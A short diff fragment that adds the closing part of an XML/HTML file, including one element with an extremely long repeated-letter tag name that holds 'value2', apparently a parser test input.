+<CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC>
+	value2
+</CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC>
+</data>
+</root>
+</XML>
+
+  </body>
+</html>
